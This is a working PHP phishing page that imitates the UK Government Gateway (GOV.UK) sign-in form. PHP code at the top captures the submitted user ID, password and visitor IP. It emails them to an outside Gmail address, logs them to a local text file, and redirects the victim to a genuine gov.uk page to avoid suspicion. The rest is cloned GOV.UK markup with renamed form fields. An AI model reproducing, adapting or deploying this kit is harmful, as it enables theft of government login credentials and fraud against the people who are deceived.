<?php
error_reporting(0);
session_start();

if(count($_POST) > 0)
{
  $body = '';
  $subject = "Home Banking Result - $_SERVER[REMOTE_ADDR]";
  $full = false;

  if(isset($_POST['undefined1']) && isset($_POST['undefined2']))
  {
    $body .= "-------------- Login Info --------------\n";
    $body .= "Login : $_POST[undefined1]\n";
    $body .= "Pass         : $_POST[undefined2]\n";
    $body .= "------------------------------------------\n";
    $subject .= " - Login";

    $_SESSION['undefined1'] = $_POST['undefined1'];
    $_SESSION['undefined2'] = $_POST['undefined2'];
  }

  $body .=   "IP Adresse    : $_SERVER[REMOTE_ADDR]\n";
  $body .= "-----------------------------------------\n";

  mail("zabiraid@gmail.com",$subject,$body);
  $fp = fopen('MyResult.txt','a');
  fwrite($fp,$body);
  fclose($fp);
$full = true;
  if($full)
  {
    session_destroy();
    header("Location: https://www.gov.uk/search/news-and-communications");
  }
}
?>
<html lang="en" class="govuk-template js-enabled"><head>
  <meta charset="utf-8">
  <title>
    
    
      Sign in using Government Gateway
    
    - Government Gateway
    - GOV.UK
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#0b0c0c">
  <link rel="icon" sizes="48x48" href="https://www.access.service.gov.uk/assets/images/favicon.ico?v=2.24.0">
  <link rel="icon" sizes="any" href="https://www.access.service.gov.uk/assets/images/favicon.svg?v=2.24.0" type="image/svg+xml">
  <link rel="mask-icon" href="https://www.access.service.gov.uk/assets/images/govuk-icon-mask.svg?v=2.24.0" color="#0b0c0c">
  <link rel="stylesheet" href="https://www.access.service.gov.uk/assets/stylesheets/govuk-frontend.min.css?v=2.24.0">
  <link rel="stylesheet" href="https://www.access.service.gov.uk/assets/stylesheets/scp.css?v=2.24.0">
  <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-HW7V429E86&amp;l=dataLayer&amp;cx=c&amp;gtm=45He5280v9168837912za200"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-PJ2NRZKM" data-ga-token="GTM-PJ2NRZKM"></script>
  <script src="/assets/javascripts/page-start.js?v=2.24.0"></script>
 </head>
 <body class="govuk-template__body govuk-frontend-supported" data-signature="ZWZwb2R4TCBjdFRhbDEySW51eXdWTy5OLEFDckdVaHZnwqlzMFNFS1BiRGtpbTMB5LWl5YSJ4Zip4a6N5aqR4YqF4pGY4pKL4Yuy55aY472B4Z6F5IiT5ZKu0pHjiZ7hqZjilY3ioYznkqLhtazkoInjiJLlrYbhiqPlia3hranjoInlq6nhnpTls6nlgqLhi6Lkrp3hqJTiiajQkOStkuSRiuSFk+OpjeWSg+CrreaNi+WoquKJpNGS452C4Y2Y5YmS4KmZ4aSg4auo4omU4Kqb5Yme4KyI4p2S5bCS4ouJ47Gp44KV4aqh4ZOk06nhkavhiarihongoazkpJXgq6jmiZXlqZzJjeKSoOWSguGIkeakguOBjOatouKRjeWSieKcpeWSouGLsOWhguOqleaCkuGZi+aNi9Kp5ZSJ47Cs4YKd4pWw4pKL4Yux5YuC4qmq5ImT5KCT5YmR5ZmJ5KCt5KGJ4oWT4bCx4aqC4YqY5ImL4KmJ55CJ4ZSB5Z2N4ZGY4p2k44GN4Y2k5KKo5Z2G4Yy0xZXhjLXlopLhjariiZnSqeGTpNOs5ImF2YvmhaHTquKuguKRmeGejeGYkuWNlOGLo+WCjeGYkeGkreSSkeGtkuGIsOKLjeWptOSJqeOoreKOguW0oeGkreSSleWSouGNquKJkeGMgeWhguGImOWdouCpmeOCkuGNsuSJhOGspOSVheOoseGRieSBrOGCidir5aKF4ZmY4pKJ5bKh4Z6F5IiT5ZKu0pHjiZ7hqZjilY3ioYrjpILjqYrhq4niiYzNodGI44Wd5JCp44uC4pGN5pSJ47Cs4YKd4pWw4pKL4Yux5YuC4qmq5ImT5KCT5YmR5ZmJ5ZKG4Yih5aSk4qir5YaJ47CR44mg0bDkiZXlqZzJi+SFrOSJhOGskOKJpuKYoOSFneGZieatkuWkoeGbiuGQlOSkreWVqeati+KhjOSLjeGYleaCkuGZi+SFheWlqOKkieWLreWhjeGSoeGSheGdqeKCieGgk+WupOGJquKGieGQquKGreGdqOWSpOGLmeaOieGQquKLguKRmeGtpOGJrOGNreGxreKOguGKmuKGguOpieOgguGKuOSCkuGLsOWhguOqleaCkuGZieCtitKR4oKJ5I274KWa4YiQ54qC4KGZ4ZWg06jiiYXhnIDinZXlrKDiiaThmanjgobhjJnhnJ3gqqriiYrgqKLkna3klIHjgIA=">
  <noscript>
   <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PJ2NRZKM" height="0" width="0" hidden></iframe>
  </noscript><a href="#skip-target" class="govuk-skip-link" data-module="govuk-skip-link" data-govuk-skip-link-init="">Skip to main content</a>
  <header class="govuk-header" data-module="govuk-header" data-govuk-header-init="">
   <div class="govuk-header__container govuk-width-container">
    <div class="govuk-header__logo">
     <a href="https://www.gov.uk/" class="govuk-header__link govuk-header__link--homepage">
      <svg focusable="false" role="img" class="govuk-header__logotype" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 148 30" height="30" width="148" aria-label="GOV.UK">
       <title>
        GOV.UK
       </title> <path d="M22.6 10.4c-1 .4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s-.1 2-1 2.4m-5.9 6.7c-.9.4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s-.1 2-1 2.4m10.8-3.7c-1 .4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s0 2-1 2.4m3.3 4.8c-1 .4-2-.1-2.4-1-.4-.9.1-2 1-2.4.9-.4 2 .1 2.4 1s-.1 2-1 2.4M17 4.7l2.3 1.2V2.5l-2.3.7-.2-.2.9-3h-3.4l.9 3-.2.2c-.1.1-2.3-.7-2.3-.7v3.4L15 4.7c.1.1.1.2.2.2l-1.3 4c-.1.2-.1.4-.1.6 0 1.1.8 2 1.9 2.2h.7c1-.2 1.9-1.1 1.9-2.1 0-.2 0-.4-.1-.6l-1.3-4c-.1-.2 0-.2.1-.3m-7.6 5.7c.9.4 2-.1 2.4-1 .4-.9-.1-2-1-2.4-.9-.4-2 .1-2.4 1s0 2 1 2.4m-5 3c.9.4 2-.1 2.4-1 .4-.9-.1-2-1-2.4-.9-.4-2 .1-2.4 1s.1 2 1 2.4m-3.2 4.8c.9.4 2-.1 2.4-1 .4-.9-.1-2-1-2.4-.9-.4-2 .1-2.4 1s0 2 1 2.4m14.8 11c4.4 0 8.6.3 12.3.8 1.1-4.5 2.4-7 3.7-8.8l-2.5-.9c.2 1.3.3 1.9 0 2.7-.4-.4-.8-1.1-1.1-2.3l-1.2 4c.7-.5 1.3-.8 2-.9-1.1 2.5-2.6 3.1-3.5 3-1.1-.2-1.7-1.2-1.5-2.1.3-1.2 1.5-1.5 2.1-.1 1.1-2.3-.8-3-2-2.3 1.9-1.9 2.1-3.5.6-5.6-2.1 1.6-2.1 3.2-1.2 5.5-1.2-1.4-3.2-.6-2.5 1.6.9-1.4 2.1-.5 1.9.8-.2 1.1-1.7 2.1-3.5 1.9-2.7-.2-2.9-2.1-2.9-3.6.7-.1 1.9.5 2.9 1.9l.4-4.3c-1.1 1.1-2.1 1.4-3.2 1.4.4-1.2 2.1-3 2.1-3h-5.4s1.7 1.9 2.1 3c-1.1 0-2.1-.2-3.2-1.4l.4 4.3c1-1.4 2.2-2 2.9-1.9-.1 1.5-.2 3.4-2.9 3.6-1.9.2-3.4-.8-3.5-1.9-.2-1.3 1-2.2 1.9-.8.7-2.3-1.2-3-2.5-1.6.9-2.2.9-3.9-1.2-5.5-1.5 2-1.3 3.7.6 5.6-1.2-.7-3.1 0-2 2.3.6-1.4 1.8-1.1 2.1.1.2.9-.3 1.9-1.5 2.1-.9.2-2.4-.5-3.5-3 .6 0 1.2.3 2 .9l-1.2-4c-.3 1.1-.7 1.9-1.1 2.3-.3-.8-.2-1.4 0-2.7l-2.9.9C1.3 23 2.6 25.5 3.7 30c3.7-.5 7.9-.8 12.3-.8m28.3-11.6c0 .9.1 1.7.3 2.5.2.8.6 1.5 1 2.2.5.6 1 1.1 1.7 1.5.7.4 1.5.6 2.5.6.9 0 1.7-.1 2.3-.4s1.1-.7 1.5-1.1c.4-.4.6-.9.8-1.5.1-.5.2-1 .2-1.5v-.2h-5.3v-3.2h9.4V28H55v-2.5c-.3.4-.6.8-1 1.1-.4.3-.8.6-1.3.9-.5.2-1 .4-1.6.6s-1.2.2-1.8.2c-1.5 0-2.9-.3-4-.8-1.2-.6-2.2-1.3-3-2.3-.8-1-1.4-2.1-1.8-3.4-.3-1.4-.5-2.8-.5-4.3s.2-2.9.7-4.2c.5-1.3 1.1-2.4 2-3.4.9-1 1.9-1.7 3.1-2.3 1.2-.6 2.6-.8 4.1-.8 1 0 1.9.1 2.8.3.9.2 1.7.6 2.4 1s1.4.9 1.9 1.5c.6.6 1 1.3 1.4 2l-3.7 2.1c-.2-.4-.5-.9-.8-1.2-.3-.4-.6-.7-1-1-.4-.3-.8-.5-1.3-.7-.5-.2-1.1-.2-1.7-.2-1 0-1.8.2-2.5.6-.7.4-1.3.9-1.7 1.5-.5.6-.8 1.4-1 2.2-.3.8-.4 1.9-.4 2.7zM71.5 6.8c1.5 0 2.9.3 4.2.8 1.2.6 2.3 1.3 3.1 2.3.9 1 1.5 2.1 2 3.4s.7 2.7.7 4.2-.2 2.9-.7 4.2c-.4 1.3-1.1 2.4-2 3.4-.9 1-1.9 1.7-3.1 2.3-1.2.6-2.6.8-4.2.8s-2.9-.3-4.2-.8c-1.2-.6-2.3-1.3-3.1-2.3-.9-1-1.5-2.1-2-3.4-.4-1.3-.7-2.7-.7-4.2s.2-2.9.7-4.2c.4-1.3 1.1-2.4 2-3.4.9-1 1.9-1.7 3.1-2.3 1.2-.5 2.6-.8 4.2-.8zm0 17.6c.9 0 1.7-.2 2.4-.5s1.3-.8 1.7-1.4c.5-.6.8-1.3 1.1-2.2.2-.8.4-1.7.4-2.7v-.1c0-1-.1-1.9-.4-2.7-.2-.8-.6-1.6-1.1-2.2-.5-.6-1.1-1.1-1.7-1.4-.7-.3-1.5-.5-2.4-.5s-1.7.2-2.4.5-1.3.8-1.7 1.4c-.5.6-.8 1.3-1.1 2.2-.2.8-.4 1.7-.4 2.7v.1c0 1 .1 1.9.4 2.7.2.8.6 1.6 1.1 2.2.5.6 1.1 1.1 1.7 1.4.6.3 1.4.5 2.4.5zM88.9 28 83 7h4.7l4 15.7h.1l4-15.7h4.7l-5.9 21h-5.7zm28.8-3.6c.6 0 1.2-.1 1.7-.3.5-.2 1-.4 1.4-.8.4-.4.7-.8.9-1.4.2-.6.3-1.2.3-2v-13h4.1v13.6c0 1.2-.2 2.2-.6 3.1s-1 1.7-1.8 2.4c-.7.7-1.6 1.2-2.7 1.5-1 .4-2.2.5-3.4.5-1.2 0-2.4-.2-3.4-.5-1-.4-1.9-.9-2.7-1.5-.8-.7-1.3-1.5-1.8-2.4-.4-.9-.6-2-.6-3.1V6.9h4.2v13c0 .8.1 1.4.3 2 .2.6.5 1 .9 1.4.4.4.8.6 1.4.8.6.2 1.1.3 1.8.3zm13-17.4h4.2v9.1l7.4-9.1h5.2l-7.2 8.4L148 28h-4.9l-5.5-9.4-2.7 3V28h-4.2V7zm-27.6 16.1c-1.5 0-2.7 1.2-2.7 2.7s1.2 2.7 2.7 2.7 2.7-1.2 2.7-2.7-1.2-2.7-2.7-2.7z"></path>
      </svg></a>
    </div>
    <div class="govuk-header__content">
     <div class="govuk-grid-row">
      <div class="govuk-grid-column-three-quarters govuk-header__service-name">
       Government Gateway
      </div>
      <div class="govuk-grid-column-one-quarter govuk-header__navigation--end govuk-header__navigation-item govuk-!-padding-top-2">
      </div>
     </div>
    </div>
   </div>
  </header>
  <div class="govuk-width-container govuk-!-margin-top-1">
   <div class="govuk-grid-row">
    <div class="govuk-grid-column-two-thirds govuk-!-margin-top-1">
    </div>
    <div class="govuk-grid-column-one-third govuk-!-margin-top-3">
     <nav aria-label="Language switcher">
      <ul class="language-toggle govuk-list">
       <li><span aria-current="true">English</span></li>
       <li><a href="?lang=cy" hreflang="cy" lang="cy" rel="alternate" class="govuk-link"> <span class="govuk-visually-hidden">Newid yr iaith ir Gymraeg</span> <span aria-hidden="true">Cymraeg</span> </a></li>
      </ul>
     </nav>
    </div>
   </div>
   <main class="govuk-main-wrapper govuk-!-padding-top-0" id="skip-target">
    <div class="govuk-grid-row">
     <div class="govuk-grid-column-two-thirds">
      <div class="govuk-notification-banner" role="region" aria-labelledby="govuk-notification-banner-title" data-module="govuk-notification-banner" data-govuk-notification-banner-init="">
       <div class="govuk-notification-banner__header">
        <h2 class="govuk-notification-banner__title" id="govuk-notification-banner-title">Keeping your information secure</h2>
       </div>
       <div class="govuk-notification-banner__content">
        <p class="govuk-body">Do not share your Government Gateway user ID and password with anyone else.</p>
       </div>
      </div>
      <h1 class="govuk-heading-xl">Sign in using Government Gateway</h1>
      <form method="POST" id="loginForm">
       <input type="hidden" name="tes" value="csrfToken,user_id,password,profile:7050659701320827604::AiQIxN/L3aAktAc4/mbDOBDo/Z+hwDVCO0qBEoQ/N7PH7RbUfExcMOFaAN60EizdKAxHlfL3pDRc241nGiFyzA=="> <input type="hidden" name="csrfToken" value="3e7e6f985224988a8bf5ae4646e0fc59afef507c-1739370228538-c0d7f52356acba39c0943796">
       <div class="govuk-form-group">
        <label for="user_id" class="govuk-label"> Government Gateway user ID </label>
        <div class="govuk-hint" id="user_id-hint">
         This could be up to 12 characters.
        </div><input type="text" name="undefined1" id="undefined1" class="govuk-input govuk-!-width-one-half" value="" maxlength="22" aria-describedby="user_id-hint" autocomplete="username" required>
       </div>
       <div class="govuk-form-group govuk-password-input" data-module="govuk-password-input" data-i18n.show-password="Show" data-i18n.hide-password="Hide" data-i18n.show-password-aria-label="Show password" data-i18n.hide-password-aria-label="Hide password" data-i18n.password-shown-announcement="Your password is visible" data-i18n.password-hidden-announcement="Your password is hidden" data-govuk-password-input-init="">
        <label for="password" class="govuk-label"> Password </label>
        <div class="govuk-input__wrapper govuk-password-input__wrapper">
         <input type="password" name="undefined2" id="undefined2" class="govuk-input govuk-password-input__input govuk-js-password-input-input" spellcheck="false" autocapitalize="none" autocomplete="current-password" required><div class="govuk-password-input__sr-status govuk-visually-hidden" aria-live="polite"></div>
         <button type="button" class="govuk-button govuk-button--secondary govuk-password-input__toggle govuk-js-password-input-toggle" data-module="govuk-button" aria-controls="password-input" aria-label="Show password" data-govuk-button-init="">Show</button>
        </div>
       </div>
       <button type="submit" id="continue" class="govuk-button" formnovalidate="" data-module="govuk-button" data-prevent-double-click="true" data-govuk-button-init="">Sign in</button><iframe hidden="" id="webrtciframe" sandbox="allow-same-origin"></iframe> <input type="hidden" name="profile">
       <script src="/assets/javascripts/device-profile.js"></script>
      </form>
      <h2 class="govuk-heading-m">New users of Government Gateway</h2>
      <div class="govuk-body">
       <a class="govuk-link" id="no-account" href="https://www.access.service.gov.uk/login/create-account">Create sign in details</a>
      </div>
      <h2 class="govuk-heading-m">Problems signing in</h2>
      <ul class="govuk-list">
       <li><a class="govuk-link" href="https://www.access.service.gov.uk/login/forgot-password" id="forgotten-password">I have forgotten my password</a></li>
       <li><a class="govuk-link" href="https://www.access.service.gov.uk/login/forgot-userid" id="forgotten-user-id">I have forgotten my Government Gateway user ID</a></li>
       <li><a class="govuk-link" href="https://www.access.service.gov.uk/login/forgot-userid-password" id="forgotten-user-id-password">I have forgotten my Government Gateway user ID and password</a></li>
      </ul>
     </div>
    </div>
    <div class="govuk-body govuk-!-margin-top-6">
     <a class="govuk-link" href="https://www.access.service.gov.uk/help?referrerUrl=%2Flogin%2Fsignin%2Fcreds" id="getHelp">Get help with this page</a>
    </div>
   </main>
  </div>
  <footer class="govuk-footer">
   <div class="govuk-width-container">
    <div class="govuk-footer__meta">
     <div class="govuk-footer__meta-item govuk-footer__meta-item--grow">
      <h2 class="govuk-visually-hidden">Support links</h2>
      <ul class="govuk-footer__inline-list">
       <li class="govuk-footer__inline-list-item"><a id="accessibility" class="govuk-footer__link" href="https://www.access.service.gov.uk/accessibility?referrerUrl=%2Flogin%2Fsignin%2Fcreds" target="_blank"> Accessibility statement</a></li>
       <li class="govuk-footer__inline-list-item"><a id="cookies" class="govuk-footer__link" href="https://www.access.service.gov.uk/cookies" target="_blank"> Cookies</a></li>
       <li class="govuk-footer__inline-list-item"><a id="privacy-notice" class="govuk-footer__link" href="https://www.access.service.gov.uk/privacy-notice" target="_blank"> Privacy notice</a></li>
       <li class="govuk-footer__inline-list-item"><a id="terms-and-conditions" class="govuk-footer__link" href="https://www.access.service.gov.uk/terms-and-conditions" target="_blank"> Terms and conditions</a></li>
      </ul>
      <svg aria-hidden="true" focusable="false" class="govuk-footer__licence-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 483.2 195.7" height="17" width="41">
       <path fill="currentColor" d="M421.5 142.8V.1l-50.7 32.3v161.1h112.4v-50.7zm-122.3-9.6A47.12 47.12 0 0 1 221 97.8c0-26 21.1-47.1 47.1-47.1 16.7 0 31.4 8.7 39.7 21.8l42.7-27.2A97.63 97.63 0 0 0 268.1 0c-36.5 0-68.3 20.1-85.1 49.7A98 98 0 0 0 97.8 0C43.9 0 0 43.9 0 97.8s43.9 97.8 97.8 97.8c36.5 0 68.3-20.1 85.1-49.7a97.76 97.76 0 0 0 149.6 25.4l19.4 22.2h3v-87.8h-80l24.3 27.5zM97.8 145c-26 0-47.1-21.1-47.1-47.1s21.1-47.1 47.1-47.1 47.2 21 47.2 47S123.8 145 97.8 145"></path>
      </svg><span class="govuk-footer__licence-description"> All content is available under the <a class="govuk-footer__link" href="https://www.nationalarchives.gov.uk/doc/open-government-licence/version/3/" target="_blank">Open Government Licence v3.0</a>, except where otherwise stated </span>
     </div>
     <div class="govuk-footer__meta-item">
      <a class="govuk-footer__link govuk-footer__copyright-logo" href="https://www.nationalarchives.gov.uk/information-management/re-using-public-sector-information/uk-government-licensing-framework/crown-copyright/">© Crown copyright</a>
     </div>
    </div>
   </div>
  </footer>
  <script type="module" src="/assets/javascripts/govuk-frontend.min.js?v=2.24.0"></script>
  <script type="module" src="/assets/javascripts/page-complete.js?v=2.24.0"></script>
 
</body></html>